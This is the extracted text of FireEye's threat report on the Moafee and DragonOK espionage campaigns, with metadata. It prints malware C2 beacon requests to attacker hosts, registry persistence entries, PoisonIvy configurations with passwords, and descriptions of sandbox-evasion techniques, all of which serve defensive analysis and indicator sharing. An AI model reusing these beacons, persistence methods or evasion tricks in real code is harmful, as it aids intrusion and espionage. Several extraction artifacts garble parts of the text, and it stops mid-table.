{
    "id": "6d222251-fb90-46c7-bc72-2e081b2b56b3",
    "created_at": "2022-10-25T16:48:12.449816Z",
    "updated_at": "2025-03-27T02:16:44.912808Z",
    "deleted_at": null,
    "sha1_hash": "bf937bb2315901541521f00abce8d441d272da16",
    "title": "Operation Quantum Entanglement",
    "authors": "FireEye",
    "file_creation_date": "2014-09-10T21:56:36Z",
    "file_modification_date": "2014-09-10T21:56:41Z",
    "file_size": 1801822,
    "plain_text": "## OPERATION QUANTUM ENTANGLEMENT\n\n#### Authors: Thoufique Haq, Ned Moran, Sai Vashisht, and Mike Scott  FireEye Labs\n\n# SECURITY\n\n\n-----\n\n**FireEye: Operation Quantum Entanglement**\n\n## CONTENTS\n\n###### Introduction and Prior Research.........................................................................................................................................................................................................................................................3\n\n Attack Methodology............................................................................................................................................................................................................................................................................................................4\n\n Attack vector...........................................................................................................................................................................................................................................................................................................................4\n\n Decoy Behavior.................................................................................................................................................................................................................................................................................................................4\n\n Evasion Techniques.................................................................................................................................................................................................................................................................................................5\n\n CPU Core Check.............................................................................................................................................................................................................................................................................................................5\n\n Password Protected Documents.........................................................................................................................................................................................................................................7\n\n Large files..........................................................................................................................................................................................................................................................................................................................................8\n\n Backdoor and RAT Tools.............................................................................................................................................................................................................................................................................................9\n\n NewCT......................................................................................................................................................................................................................................................................................................................................................9\n\n Nflog......................................................................................................................................................................................................................................................................................................................................................... 15\n\n Sysget/HelloBridge...........................................................................................................................................................................................................................................................................................17\n\n Mongall ........................................................................................................................................................................................................................................................................................................................................... 17\n\n PoisonIvy...................................................................................................................................................................................................................................................................................................................................... 17\n\n Threat Actor Attribution ..................................................................................................................................................................................................................................................................................17\n\n Campaign #1: Moafee ...............................................................................................................................................................................................................................................................................17\n\n Campaign #2: DragonOK .................................................................................................................................................................................................................................................................19\n\n Acknowledgements..........................................................................................................................................................................................................................................................................................................20\n\n Appendix A: Python Routine to Decode NewCT and CT Beacons.....................................................................................................21\n\n Appendix B: Campaign codes embedded in NewCT/CT.................................................................................................................................................22\n\n Appendix C: Moafee and DragonOK Clusters..........................................................................................................................................................................................23\n\n\n-----\n\n**FireEye: Operation Quantum Entanglement**\n\nIn the realm of quantum mechanics, entanglement\nis a peculiar phenomenon in which a pair of\n**particles takes on the properties of each other,**\n**regardless of the distance between them. Albert**\nEinstein best described this intertwining\nphenomenon as “spooky action at a distance”[1].\nThis behavior is analogous to the observed\ncorrelation between the two geographically\nseparated attack groups detailed in this paper.\n\nWe have uncovered two distinct attack campaigns\noriginating from different geographic regions in\nChina using similar tools, techniques and\nprocedures (TTPs). In both campaigns, each attack\ngroup employed multiple overlapping TTPs to\ninfiltrate their targets, including similar custom\nbuilt backdoors and remote administration tools\n(RATs) such as CT/NewCT, Mongall and Nflog\n(and publicly available RATs such as PoisonIvy) to\nmaintain access to victim networks. We also\nobserved the use of another custom backdoor\ncalled Sysget/HelloBridge by one of the attack\ngroups, which we believe is possibly shared\nbetween the campaigns as well. Both groups were\nalso used a well-known proxy tool named HTRAN,\nwhich is an abbreviation for “HUC Packet\nTransmit Tool”[2] . This tool proxies connections\nthrough intermediate hops and aids the attackers\nin disguising their true geographical location when\ninteracting with the victim networks. We also\nobserved both attack groups using similar\ntechniques to evade detection by security\n\n\nproducts. In sum, we believe that these groups are\nfrom two distinct regions in China and possibly (1)\nare collaborating, (2) received the same training,\n(3) have a common toolkit supply chain, or some\ncombination of these three.\n\nThe relationship between the two attack groups\nmay be direct or indirect, but based on our\ncurrent visibility, they seem to have two distinct\nmissions, with each one targeting different\nindustries. We were able to ascertain the\ngeographical locations of the two attack groups\nby analyzing their “HTRAN” infrastructure over\na period of time. We believe a separate third\ngroup may also be employing these tools, but\nwe do not have sufficient insight in to this\nadditional group at this time.\n\nThe attack group “Moafee” (named after their\ncommand and control infrastructure) appears\nto operate out of the Guangdong province in\nChina and is known to target the governments\nand military organizations of countries with\nnational interests in the South China Sea. The\nseas in this region have multiple claims of\nsovereignty and hold high significance, as it is\nthe second busiest sea-lane in the world[3] and\nare known to be rich in resources such as rare\nearth metals[4], crude oil, and natural gas[5]. We\nhave also observed the Moafee group target\norganizations within the US defense\nindustrial base.\n\n\n1 http://www.technologyreview.com/view/427174/einsteins-spooky-action-at-a-distance-paradox\n2 http://www.secureworks.com/cyber-threat-intelligence/threats/htran/\n\n3 http://en.wikipedia.org/wiki/South_China_Sea#Resources\n\n4 http://www.ifri.org/downloads/ifricanonopedseamanecs.pdf\n\n5 http://www.eia.gov/countries/regions-topics.cfm?fips=scs\n\n\n-----\n\n**FireEye: Operation Quantum Entanglement**\n\nThe attack group “DragonOK” (named after an\nevent name in one of their payload executables [6])\nappears to operate out of the Jiangsu province\nin China, and is known to target high-tech and\nmanufacturing companies in Japan and Taiwan.\nThe propensity to target these industries\npossibly demonstrates an interest in gaining\neconomic competitive advantage in the region\nthrough the acquisition of trade secrets .\n\n###### Attack Methodology:\n**Attack vector:**\nThe primary observed attack vector used by both\ngroups is spear-phishing emails. The themes--or\ntopics—used in the emails from the DragonOK\ngroup were well crafted and highly tailored to the\ntarget audience. We also found this attack group\n\n\nusing the appropriate language for each of their\ntargets in the phishing emails– such as Japanese\nand traditional Chinese (mainly used in Taiwan).\nThe attachments in the email were typically an\nexecutable file embedded in a ZIP archive or\npassword-protected Microsoft Office documents.\nOne such email, shown in Figure 2 and used by the\nDragonOK group was written in traditional\nChinese, and targeted a Taiwanese technology firm\n\n**Decoy Behavior**\nWe observed both attack groups employ decoy\ndocuments in order to help deceive potential\nvictims. The decoy documents are presented to\nthe victim while the malware runs in the\nbackground. One such Japanese-language decoy\ndocuments used by the “DragonOK” group is\n\n\n6 http://www.fireeye.com/blog/technical/malware-research/2013/02/hackers-targeting-taiwanese-technology-firm.html\n\n\n-----\n\n**FireEye: Operation Quantum Entanglement**\n\nshown below. It appears to be a resume of\nsomeone from Kyoto University in Japan who was\ninvolved in English language studies.\n\n**Evasion Techniques:**\nBoth attack groups employ numerous, yet\ncommon techniques in an attempt to evade\ndetection by various sandbox environments,\nantivirus (AV) software, and gateway firewalls. We\nobserved environment-based evasion, the use of\n\n\nlarge file sizes, and password-protected\ndocuments – each of which are described in the\nsections below.\n\n**CPU Core Check**\nThe first-stage payload for RATs called “CT/\nNewCT” used by both the Moafee and\nDragonOK attack groups employs an evasive\n“CPU core check” technique. The payload\nattempts to detect the number of processor\n\n\n**Figure 2:**\nEmail containing\n“888888”\npassword in body\nwith passwordprotected\ndocument\nattached\n\n\n-----\n\n**FireEye: Operation Quantum Entanglement**\n\ncores in the running environment, by calling the\n\"GetSystemInfo\" API, which returns a structure\nwith system data, including number of cores. If\nonly one core is detected, it quits as seen in\nFigure 5. This probably is an attempt to detect\nvirtualized environments such as sandboxes, as\n\n\nwell as other analysis environments used by\nreverse engineers, which often tend to be\nconfigured with a single core.\n\nWe also observed a similar evasion technique\nwithin the “Sysget/HelloBridge” payload\n\n\n**Figure 3:**\nExample decoy\ndocument\npresented to the\nvictim during a\nDragonOK phishing\nattack\n\n\n-----\n\n**FireEye: Operation Quantum Entanglement**\n\n\n**Figure 4:**\nStructure returned by\nGetSystemInfo API\n\n\nemployed by the DragonOK group. It invokes\na similar call to “GetSystemInfo” to\ndetermine the number of active CPU cores,\nand the code quits if the system is configured\nwith only one core.\n\n**Password Protected Documents:**\nThe “DragonOK” group in particular is known\nto use password-protected documents\ndelivered as attachments in emails, with the\n\n\npassword listed in the contents of the email.\nThis method probably is used to evade\ndetection by AV software, gateway firewalls\nand malware sandboxes. One such example\nusing the password “888888” is shown in\nFigure 2 and Figure 6, and has been observed\nby FireEye[7] before. Another similar sample\nwas referenced by the “contagio” blog[8] and\nused the password “8861”.\n\n\n**Figure 5:**\nEvasion based on\nCPU core detection\n\n\n7 http://www.fireeye.com/blog/technical/malware-research/2013/02/hackers-targeting-taiwanese-technology-firm.html\n\n8 http://contagiodump.blogspot.com/2012/08/cve-2012-0158-generated-8861-password.html\n\n\n-----\n\n**FireEye: Operation Quantum Entanglement**\n\n\n**Figure 6:**\nPassword-protected\ndocument\n\n\n**Large files:**\nIn older phishing emails that link to the tools\nused by DragonOK and Moafee, we observed\nan implant over 10 megabytes in size. It was\npadded with unnecessary null bytes in the\n\n\noverlay section of the file, in order to increase\nthe file size as shown in Figure 7. This probably\nwas done to evade detection, as many hostbased and network-based AV engines do not\nhave the ability to scan large files.\n\n\n-----\n\n**FireEye: Operation Quantum Entanglement**\n\n\n**Figure 7:**\nLarge null padded\noverlay section\n\n\n###### Backdoor and RAT Tools:\n CT/NewCT\n Dropper:\nThis is a first stage payload that drops and runs the\nNewCT implant. The first stage payload (example:\n```\n46e55cdf507ef10b11d74dad6af8b94e)\n\n```\nattempts to detect the number of CPU cores in the\n\n\nrunning environment by calling GetSystemInfo\nas described in the previous section. If the CPU\ncore check detects more than one core, it implants\nthe NewCT2 RAT in %temp%\\MSSoap.DLL\n(some variants will use BurnDCSrv.DLL and\n```\nIntelAMTPP.DLL) and executes the written file.\n\n```\nThe actual implant is packaged in the resource\nsection of the dropper with a fake bitmap (BMP)\nheader, as shown in Figure 8.\n\n\n-----\n\n**FireEye: Operation Quantum Entanglement**\n\n\n**Figure 8:**\nDLL implant\nembedded in\nresource section with\na fake BMP header\n\n\nThe implant also creates a registry entry file called\nnamed “Windows.reg” and imports it the\ncontents of this file into the registry, using the\ncommand: “regedit.exe /s Windows.reg”.\n\n\nThese registry entries ensure startup persistence.\nThe contents of \"Windows.reg\" is populated based\non the Operating System (OS) which is determined\nby a call to the GetVersionEx API.\n\nIf “dwBuildNumber” is equal to 2 (VER_\n```\nPLATFORM_WIN32_NT) and “dwMajorVersion” is\n\n```\nless than 6 (prior to Windows Vista) it adds\nfollowing entry for persistence:\n```\n[HKEY_CLASSES_ROOT\\CLSID\\{fbeb8a05beee-4442-804e-409d6c4515e9}\\\nInProcServer32]\n@=\"%Temp%\\MSSoap.DLL\"\n\n```\nOtherwise it creates a copy of itself to %Temp%\\\n```\nWmiPrvSer.exe and creates the following entry\n\n```\nfor persistence:\n```\nHKCU \\Software\\Microsoft\\Windows\\\nCurrentVersion\\Run\\\"dllhost\" =\n%Temp%\\WmiPrvSer.exe\n\n```\n\n-----\n\n**FireEye: Operation Quantum Entanglement**\n\nWe also found some clues in the binary that\nindicate that the tool was authored and built by\nsomeone using Chinese fonts on their computer. It\ncontains resource strings in English but the\nlanguage is set to Chinese as shown below.\n\n\n**Implant**\nThe implant (example:\n```\nccff6e0a6f5e7715bdaf62adf0cbed4f) is\n\n```\ncalled “NewCT/CT” RAT. The particular version we\nanalyzed was NewCT version 2. The implant has\npersistence mechanisms and contains functionality\nto perform command and control communication.\nThis backdoor also has functionality to load\nadditional plugins from the command and control\nserver. It exports the following two functions:\n```\nSendData\nCreateInstance\n\n```\nIt creates a mutex “HFRM_” to ensure there is only\none running copy of the backdoor. It ensures this\nby checking if the return value from\n```\nCreateMutexA is 183 (\\xB7), which\n\n```\ncorresponds to “ERROR_ALREADY_EXISTS”[9].\n\nThe payload emits the “POST” network beacon\nshown below along with stub data. The header\nvalues are hardcoded in the payload, specifically\nthe values for “User-Agent”, “Cache-Control” and\nthe bytes at offset 0 of the stub (\\xcf\\xcf) may be\nof interest to network defenders.\n\n\n**Figure 11:**\nMutex usage and\nchecks to ensure one\nrunning copy\n\n\n9 http://msdn.microsoft.com/en-us/library/windows/desktop/ms681382%28v=vs.85%29.aspx\n\n\n-----\n\n**FireEye: Operation Quantum Entanglement**\n\n```\nPOST / HTTP/1.1\nAccept-Language: en-en\nContent-Type: application/octetstream\nPragma: no-cache\nCache-Control: max-age=259200\nConnection: Close\nContent-Length: 1594\nUser-Agent: Mozilla/4.0\n(compatible; MSIE 6.0;Windows NT\n5.1)\nHost: http.jpaols[.]com\\x0d\\x0a\\\nx0d\\x0a\\xcf\\xcf...\n\n```\n\nThe POST stub contains encrypted data. The\nencrypted data has two layers of abstraction. It is\nsubjected to a bitwise NOT operation followed by\nencryption using a randomly generated 4-byte\nXOR key. The data within the POST stub is\nconstructed in a buffer with a header at offset 0 (\\\nx30\\x30) followed by the remote sever, remote\nport, XOR encrypted data and function call\nlocation. The function call location is represented\nby the textual values shown in the table below and\nis selected using a switch case statement as shown\nin Figure 12. It is used by the attacker to track the\ncall path that resulted in the network beacon. The\nXOR encrypted data contains the MAC Address,\nhostname and campaign code.\n\n|Numeric Representation|Textual Representation|\n|---|---|\n|0|index.asp|\n|1|index.php|\n|2|index.jsp|\n|3|index.css|\n|4|home.asp|\n\n\n**Figure 12:**\nCall path determined\nand embedded in\nnetwork beacon\n\n\n-----\n\n**FireEye: Operation Quantum Entanglement**\n\nTo elucidate the encryption scheme, let us go over a sample decryption process. The Figures 13 and 14\nbelow shows data before and after a bitwise NOT operation.\n\n\n**Figure 13:**\nEncrypted POST stub\n\n\n**Figure 14:**\nPOST stub after\nbitwise NOT\noperation\n\n\n**Figure 15:**\nEmbedded XOR\nencrypted data in\nPOST stub\n\n\nIn the resulting data after NOT operation, the XOR key is \\x30\\x30\\x34\\x31. When applied to the hex\ndata following it, we get the decrypted data below, which contains the MAC Address, hostname, and\ncampaign code. The Python routine to perform this decryption is included in Appendix A\n\nWe observed plugin functionality in the implant. It has the ability to load a DLL downloaded from the\nremote server, and calls the following export functions in the DLL:\n```\nPlugin_GetID\nPlugin_Init\nPlugins_Start\nPlugin_End\n\n```\n\n-----\n\n**FireEye: Operation Quantum Entanglement**\n\n\n**Figure 16:**\nDLL Plugin\nfunctionality\nallowing additional\npayloads to be\nloaded from the\nserver\n\n\nThe call graph for this functionality is shown in\nFigure 16.\n\nNewCT RAT evolved from older versions called\n“CT”, which has been observed being used in\nassociation with the “Nflog” Backdoor. The\nfollowing password-protected document\n(46ac122183c32858581e95ef40bd31b3)\ncreates a DLL implant called IntelAMTPP.dll\n(ebd1f5e471774bb283de44e121efa3e5),\nwhich is the “CT” RAT. In this case, the “CT” implant\nis 10 MB in size, as it has padded null bytes at the\nend of the file to increase file size in a possible\nattempt to evade AV engines as described in the\nprevious section on evasion techniques. The “CT”\nimplant has identical functionality to “NewCT”, as\nobserved from the embedded strings.\n```\n00005A58 Connection:close\n00005A6C Cache-Control: maxage=259200\n00005A8C Pragma: no-cache\n00005AA0 Mozilla/4.0 (compatible;\nMSIE 6.0;Windows NT 5.1)\n00005AD4 Content-Type: application/\noctet-stream\n00005AFC image/gif,\nimage/x-xbitmap, image/jpeg, image/\npjpeg, /\n00005B38 Accept-Language: en-en\n\n```\n```\n00005B50 %s%02x\n00005B5C home.asp\n00005B68 index.css\n00005B74 index.jsp\n00005B80 index.php\n00005B8C index.asp\n00005EFC ct.datangcun.com\n00005F3C ct.datangcun.com\n00005F7C 20120509\n00005F8C CT V2.1\n00006374 Plugin_End\n00006380 Plugin_Start\n00006390 Plugin_Init\n0000639C Plugin_GetID\n\n```\nThis version was called “CT V2.1” by the author,\nwhich may indicate that there were other earlier\nversions of this RAT and that it was improved\nupon incrementally. One of the command and\ncontrol servers used by a variant of this implant\nis aptly named “ct.datangcun[.]com”. We\ndo not believe either Moafee or DragonOK have\ncontrolled the domain “ct.datangcun[.]\n```\ncom”, but it was probably controlled by a third\n\n```\ngroup which also used the implant in a separate\ncampaign. The network beacon for version 2.1 is\nshown below; it uses the same encryption\nscheme as “NewCT”:\n\n\n-----\n\n**FireEye: Operation Quantum Entanglement**\n```\n            POST / HTTP/1.1\n            Accept-Language: en-en\n            Content-Type: application/oc            tet-stream\n            Pragma: no-cache\n            Cache-Control: max-age=259200\n            Content-Length: 1572\n            User-Agent: Mozilla/4.0 (compati            ble; MSIE 6.0;Windows NT 5.1)\n            Host: ct.datangcun[.]com:1353\\x0d\\\n            x0a\\x0d\\x0a\\xcf\\xcf\n\n```\nWe also observed both attack groups using\ncampaign codes within this implant and which\nare listed in Appendix B. The campaign codes referred to victim countries, attack dates, command\nand control infrastructure, and other operational\ncodes – which remain undeciphered.\n\n**Nflog**\nWe have observed DragonOK and Moafee use\nthe Nflog implant in addition to an earlier\nversion of the NewCT2 implant. The password-protected XLS document (46ac```\n            122183c32858581e95ef40bd31b3) ref\n```\nerenced earlier also drops an “Nflog” implant\n(a3d3b0686e7bd13293ad0e63ebec67af)\nin addition to ….. The “Nflog” implant emits the\nfollowing network beacon format:\n\nPOST /NfLog/Nfile.asp HTTP/1.1\n```\n            Accept: */*\n            User-Agent: Mozilla/5.0 (compati            ble; MSIE 7.0;Windows NT 5.1)\n            Host: \n            Content-Length: 0\n            Cache-Control: no-cache\n            POST /NfLog/NfStart.asp?Clien            tId={LocalIP}%20<49d0>%20{Ex\n```\nternalIP}&Nick={Identifier}&d\n```\ntime=T:8-6-0-53 HTTP/1.1\nAccept: */*\nUse-Agent: Mozilla/4.0 (compatible;\nMSIE 6.0; Windows NT 5.0; .NET CLR\n1.1.4322)\nHost:\nContent-Length: 36\nCache-Control: no-cache\nCookie: ASPSESSIONIDACCARCDD=OKNPGCKDLEKEHBOHIHLCOMHD\n\n```\nWe have observed the use of a newer variant of\nNflog (example: 3eab5e12f99b47e822721e```\n93639ba1d1) being employed in attacks, which\n\n```\nhas the beacon format shown below:\n```\nPOST /windowsxp/SNews.asp?HostID={MAC Address} HTTP/1.1\nAccept: /\nCache-Control: no-cache\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; .NET\nCLR 1.1.4322)\nHost:\nContent-Length: 126\nConnection: Close\nCookie: ASPSESSIONIDAARSSTTB=ECDDKIAAOHGODEKKFGOKNJCD\n\n```\nOther URI formats it uses are as follows:\n```\n/windowsxp/SSports.asp?HostID=\n/windowsxp/SWeather.asp?HostID=\n/windowsxp/SJobs.asp?HostID=\n/windowsxp/STravel.asp?HostID=\n/windowsxp/NfHostInfo.asp?NickId=\n/windowsxp/SGames.asp?HostID=\n\n```\nNote the same User-Agent “Mozilla/4.0\n```\n(compatible; MSIE 6.0; Windows NT\n5.0; .NET CLR 1.1.4322)” is used by both\n\n```\n\n-----\n\n**FireEye: Operation Quantum Entanglement**\n\nthe older and newer version of “Nflog” samples. We also found code-level similarities in the network\ncommunication function code, as well as the data collection function code shown in Figure 17. This\nstrongly suggests that it is an updated version of the “Nflog” backdoor.\n\n\n**Figure 17:**\nIdentical data\ncollection function\nseen in both older\nand newer Nflog\nvariants\n\n\n-----\n\n**FireEye: Operation Quantum Entanglement**\n\n**Sysget/HelloBridge**\nThis tool has recently been analyzed by Secureworks [10]. We observed the DragonOK attacker\nemploy this tool against targets in Japan and\nTaiwan (e.g. 57e3d002542e07f2eb09fd2b1b0eeab2), as also noted by Secureworks. We have\nnot yet seen the Moafee group use this tool. This\nimplant has the following beacon format:\n\nGET /el/sregister.php?name=[REDACTED]\nHTTP/1.1\nUser-Agent: Mozilla/5.0 (compatible; MSIE 10.0;\nWindows NT 6.1; Trident/6.0)\nHost: 122.10.62.137\nConnection: Keep-Alive\nOther URI formats include:\n\n/el/slogin.php?uid=\n/el/suploadfile.php?item=\n/el/suploadfile.php\n\n**Mongall**\n\nFireEye has previously analyzed this backdoor[11],\nwhich is used by multiple other groups in addition\nto DragonOK and Moafee. DragonOK in particular is known to frequently use this implant (e.g.\n```\n            e8d77d19e1c6f462f4a5bf6fbe673a3c),\n\n```\nwhich has the following network beacon format:\n```\n            GET /3000FC080000[REDACTED 00000000\n            0000000000000000000000000000000000\n            0000000000000000000000000000000000\n            0000000000000000000000000000000000\n            00100000[REDACTED]0000000000000000\n            000000000000000000000000000000000\n            0 0000000000000000[REDACTED]000000\n            HTTP/1.1 User-Agent: Mozilla/4.0\n            (compatible; MSIE 7.0; Windows NT\n            6.1; WOW64; Trident/6.0; SLCC2;\n            .NET CLR 2.0.50727; .NET CLR\n            3.5.30729; .NET CLR 3.0.30729;\n            Media Center PC 6.0)\n            Host: mail.jpaols[.]com:443\n            Cache-Control: no-cache\n\n```\n\n**PoisonIvy**\nThis is a publicly available RAT used by multiple\nthreat actors, which has been extensively analyzed\nin a previous FireEye white paper[12]. The extracted configuration blocks from a \"DragonOK\"\nPoisonIvy variant (65fcc9b9ff608801edc```\n697552438cfee), is shown below:\nID: ftp\nDomains: ftp.skydnastwm.com:15836|\nPassword: Ecp982*@Me2\nMutex: fftp\n\n```\nIn contrast, here is an extracted PoisonIvy\nconfiguration block from a \"Moafee\" instance\n```\n(9ebe86a648b1f19836251f946a160b16),\n\n```\nas shown below:\n```\nID: \nDomains: afp.mozjlla.com|\nPassword: 741526\nMutex: )!afpA.I4\n\n###### Threat Actor Attribution \n\n```\n**Campaign #1: Moafee**\nWe have observed the Moafee group target the\ngovernments and militaries of countries with\nnational interests in the South China Sea. We have\nalso observed this group target companies within\nthe US defense industrial base.\n\nAs discussed, we have observed the Moafee group\nuse a number of different tools including Poison\nIvy, Nflog, Mongall, and NewCT2.\n\nWe found this group running HTRAN on one of\ntheir front-end command and control servers. The\ncommand and control server in question was\n\n\n10 http://www.secureworks.com/resources/blog/research/hellobridge-trojan-uses-heartbleed-news-to-lure-victims/\n\n11 http://www.fireeye.com/blog/technical/malware-research/2014/03/spear-phishing-the-news-cycle-apt-actors-leverage-interest-in-the-disappearance-ofmalaysian-flight-mh-370.html\n\n12 http://www.fireeye.com/resources/pdfs/fireeye-poison-ivy-report.pdf\n\n13 http://en.wikipedia.org/wiki/South_China_Sea#Resources\n\n14 http://www.ifri.org/downloads/ifricanonopedseamanecs.pdf\n\n15 htt // i / t i / i t i f ?fi\n\n\n-----\n\n**FireEye: Operation Quantum Entanglement**\n\nlocated at 58.64.201.229. We monitored this\nserver for two months, from January to March\nthis year. During this time period, we observed the\nfollowing domains resolving to 58.64.201.229:\n\nph.moafee[.]com\nafp.mozjlla[.]com\nmofa.mozjlla[.]com\nacer.moafee[.]com\ndel.moafee[.]com\njnt.moafee[.]com\npcg.moafee[.]com\nsslc.moafee[.]com\nat.moafee[.]com\nlw.moafee[.]com\nks.moafee[.]com\n\n\noa.moafee[.]com\nxxpp.moafee[.]com\nhp.moafee[.]com\ngumm.mozjlla[.]com\nmsn.moafee[.]com\n\nDuring this same time frame, the HTRAN client\nat 58.64.201.229 was observed\nattempting to connect to a number of different\nbackend HTRAN servers. All of these HTRAN\nservers were located in the Guangdong\nProvince and operated by CHINANET.\n\nAdditionally, the Moafee group also hosted a\nPoisonIvy command and control server at phi.\n```\ncrabdance[.]com. Between April 30, 2012\n\n```\n|DATE|CNC|HTRAN Backend|HTRAN Backend Geolocation|\n|---|---|---|---|\n|2014-03-15|58.64.201.229|169.254.163.19|LINK LOCAL|\n|2014-03-02|58.64.201.229|113.65.22.148|CHINANET GUANGDONG PROVINCE NETWORK|\n|2014-02-22|58.64.201.229|169.254.61.191|LINK LOCAL|\n|2014-02-18|58.64.201.229|113.68.111.111|CHINANET GUANGDONG PROVINCE NETWORK|\n|2014-02-15|58.64.201.229|113.68.108.62|CHINANET GUANGDONG PROVINCE NETWORK|\n|2014-02-12|58.64.201.229|113.68.168.73|CHINANET GUANGDONG PROVINCE NETWORK|\n|2014-02-02|58.64.201.229|169.254.92.25|LINK LOCAL|\n|2014-01-30|58.64.201.229|113.65.43.42|CHINANET GUANGDONG PROVINCE NETWORK|\n|2014-01-27|58.64.201.229|113.66.12.112|CHINANET GUANGDONG PROVINCE NETWORK|\n|2014-01-25|58.64.201.229|113.65.41.28|CHINANET GUANGDONG PROVINCE NETWORK|\n|2014-01-20|58.64.201.229|113.68.171.67|CHINANET GUANGDONG PROVINCE NETWORK|\n|2014-01-15|58.64.201.229|113.68.110.239|CHINANET GUANGDONG PROVINCE NETWORK|\n\n\n13 http://www.fireeye.com/blog/technical/malware-research/2014/03/spear-phishing-the-news-cycle-apt-actors-leverage-interest-in-the-disappearance-ofmalaysian-flight-mh-370.html\n\n12 http://www.fireeye.com/resources/pdfs/fireeye-poison-ivy-report.pdf\n\n\n-----\n\n**FireEye: Operation Quantum Entanglement**\n\nand July 1, 2012, the phi.crabance[.]com domain\nresolved to 98.126.91.66. This IP was\nobserved hosting a HTRAN proxy client, which\nwas seen connecting to a backend HTRAN server\nhosted at 113.66.248.60. This server was also\nlocated in the Guangdong Province and operated\nby CHINANET.\n\nIn short, the Moafee group was observed\nconsistently hosting their backend HTRAN\nservers in Guangdong. This observation may\nreveal that the Moafee group is physically located\nin this province.\n\n**Campaign #2: DragonOK**\nWe have observed the DragonOK group\ntarget high-technology and manufacturing\ncompanies in both Japan and Taiwan. This\ngroup has used similar malware to the Moafee\ngroup described above. Specifically, we\nobserved DragonOK employing PoisonIvy,\n\n\nNflog, Mongall, CT, and NewCT.\n\nLike the Moafee group, we observed the\nDragonOK group running an HTRAN proxy\nclient on one of their front-end command\nand control servers. For approximately one\nweek, between July 31, 2013 and August 8,\n2013, the domain www.ndbssh[.]com served\nas a command and control server for\nMongall payloads distributed by the\nDragonOK group. During this time,\nDragonOK also ran an HTRAN proxy client\non www.ndbssh[.]com.\n\nThis HTRAN client was seen attempting to\nconnect to three different HTRAN servers\nlocated in the Jiangsu province and operated\nby CHINANET.\n\nThe domain www.ndbssh[.]com resolved to\n```\n206.161.216.219 between 2013-09-28 and\n\n```\n|DATE|CNC|HTRAN Backend|HTRAN Backend Geolocation|\n|---|---|---|---|\n|2013-08-05|www.ndbssh.com|58.217.168.205|CHINANET JIANGSU PROVINCE NETWORK|\n|2013-08-04|www.ndbssh.com|222.95.171.178|CHINANET JIANGSU PROVINCE NETWORK|\n|2013-07-31|www.ndbssh.com|58.217.169.95|CHINANET JIANGSU PROVINCE NETWORK|\n\n\n2013-10-04. The following other domains were seen resolving to this same IP:\n\n**DATE** **CNC Domain**\n```\n     2013-08-20 www.ghostale[.]com\n     2013-09-06 www.ycbackap[.]com\n     2013-12-20 asp.skyppee[.]com\n     2013-12-20 facebook.skyppee[.]com\n     2013-12-20 pop.skyppee[.]com\n     2013-12-20 mail.skyppee[.]com\n     2013-12-20 mil.skyppee[.]com\n     2013-12-20 web.pktmedia[.]com\n     2013-12-20 bbs.pktmedia[.]com\n\n```\nThe DragonOK group was observed hosting their backend HTRAN servers in Jiangsu. This\nobservation may reveal that the DragonOK group is physically located in the Jiangsu province.\n\n|DATE|CNC Domain|\n|---|---|\n|2013-08-20|www.ghostale[.]com|\n|2013-09-06|www.ycbackap[.]com|\n|2013-12-20|asp.skyppee[.]com|\n|2013-12-20|facebook.skyppee[.]com|\n|2013-12-20|pop.skyppee[.]com|\n|2013-12-20|mail.skyppee[.]com|\n|2013-12-20|mil.skyppee[.]com|\n|2013-12-20|web.pktmedia[.]com|\n|2013-12-20|bbs.pktmedia[.]com|\n\n\n-----\n\n**FireEye: Operation Quantum Entanglement**\n\n###### Conclusion\nBased on the geolocation evidence provided\nin this paper, it appears that different\noperators executed the Moafee and\nDragonOK campaigns. This conclusion is\nsupported by the following assessments:\n\n               - The campaigns target different industries in\ndifferent geographic locations. The Moafee\ncampaign targets government and military\norganizations in countries with national\ninterests in the South China Sea. In contrast,\nthe DragonOK campaign has been observed\ntargeting high-technology and manufacturing\ncompanies in Japan and Taiwan.\n\n               - The campaigns maintain separate back-end\ncommand and control infrastructures hosted\nin different provinces in Mainland China. The\nMoafee campaign can be traced to\ninfrastructure located in the Guangdong\nprovince, whereas the DragonOK campaign\ncan be traced to infrastructure located in the\nJiangsu province.\n\nWhile it seems that different operators are\nresponsible for these two campaigns, our\nresearch showed that these operators share a\nnumber of common tools, techniques and\nprocedures (TTPs). We also believe a separate\nthird group is using these TTPs but we do not\nhave sufficient insight to this operator at this\ntime. The shared TTPs include:\n\n21 http://technet.microsoft.com/en-us/library/hh849687.aspx\n\n22 http://technet.microsoft.com/en-us/library/hh847739.aspx\n\n\n\n- Usage of the same custom backdoors and\nRATs such as CT/NewCT/NewCT2,\nMongall, Nflog, as well as off-the-shelf\nRATs such as PoisonIvy, to maintain access\nto the victims’ networks.\n\n- Usage of HTRAN to proxy their command\nand control communication.\n\n- Usage of the same evasion techniques to\nevade detection such as environment\nchecks based on CPU cores, password\nprotected documents, and the use of large\nnull padded files.\n\nWe assess that these shared TTPs may be the\nresult of:\n\n- A direct relationship between the operators.\n\n- An indirect relationship such as the\ncompletion of a common training regimen.\n\n- A common quartermaster or supply-chain for\ntheir malware tools.\n\n###### Acknowledgements:\nWe would like to thank Ronghwa Chong, Nart\nVilleneuve, Darien Kindlund, Kenneth Gears\nand Jonathan Wrolstad for their insight,\nresearch and support.\n\n\n-----\n\n**FireEye: Operation Quantum Entanglement**\n\n###### Appendix A: Python Routine to Decode NewCT and CT Beacons\n\n```\ndef dexor(data,key):\n   buffer = “”\n   keylen = len(key)\n   for i in range(0,len(data)):\n     buffer += chr(ord(data[i]) ^ ord(key[i % keylen]))\n   return buffer\ndef decrypt(data):\n   inverted = “”\n   for byte in data:\n     try:\n       inverted += chr(~ord(byte) & 0xFF)\n     except:\n       continue\n   beacon = “\\\\x” + “\\\\x”.join(“{0:x}”.format(ord(c)) for c in\ninverted[0:4])\n   end_marker = “index”\n   end = inverted.find(end_marker,0) + len(end_marker) + 4\n   values = inverted[:end].split(‘/’)\n   if len(values) < 7:\n     return 0\n   key = values[1]\n   data1 = binascii.unhexlify(values[3].replace(‘%’,”))\n   data2 = binascii.unhexlify(values[5].replace(‘%’,”))\n   c2_end = values[0].find(‘\\x00’) - 1\n   c2 = values[0][4:c2_end]\n     return beacon + “|” + c2 + “|” + dexor(data1,key) + “|” + \ndexor(data2,key) + “|” + values[6]\n\n```\n\n-----\n\n**FireEye: Operation Quantum Entanglement**\n\n###### Appendix B: Campaign codes embedded in NewCT/CT\n\n|First stage payload|Version|Implant|Implant Name|C2 Server|Campaign code|\n|---|---|---|---|---|---|\n|46e55cdf507ef10b 11d74dad6af8b94e|NewCT2|81998ee8b8f8304d 